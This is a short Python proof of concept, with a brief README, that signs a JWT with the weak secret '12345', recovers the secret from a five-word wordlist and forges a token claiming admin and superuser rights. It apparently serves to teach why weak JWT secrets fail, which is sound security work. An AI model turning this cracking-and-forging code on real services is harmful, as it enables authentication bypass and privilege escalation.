"""# JWT Attack Demo

## Files
- jwt_attack_demo.py : PoC brute-force + forged JWT
- JWT_Security_Report.pdf : Research report

## Run
pip install pyjwt
python jwt_attack_demo.py
"""

# jwt_attack_demo.py
# Demonstrates brute-forcing a weak HS256 JWT secret and forging a token
# Requirements: pip install pyjwt

import jwt

def create_weak_token(secret="12345"):
    payload = {"sub": "admin", "role": "admin"}
    return jwt.encode(payload, secret, algorithm="HS256")

def brute_force_token(token, candidates):
    for secret in candidates:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            return secret, decoded
        except jwt.InvalidSignatureError:
            continue
    return None, None

if __name__ == "__main__":
    weak_secret = "12345"
    token = create_weak_token(weak_secret)
    print("[*] Token generated:", token)

    wordlist = ["password", "1234", "12345", "admin", "letmein"]
    found, decoded = brute_force_token(token, wordlist)

    if found:
        print(f"[+] Secret cracked: {found}")
        print("[+] Decoded payload:", decoded)
        forged = jwt.encode(
            {"sub": "admin", "role": "admin", "superuser": True},
            found,
            algorithm="HS256"
        )
        print("[+] Forged token:", forged)
    else:
        print("[-] Secret not found in candidate list")
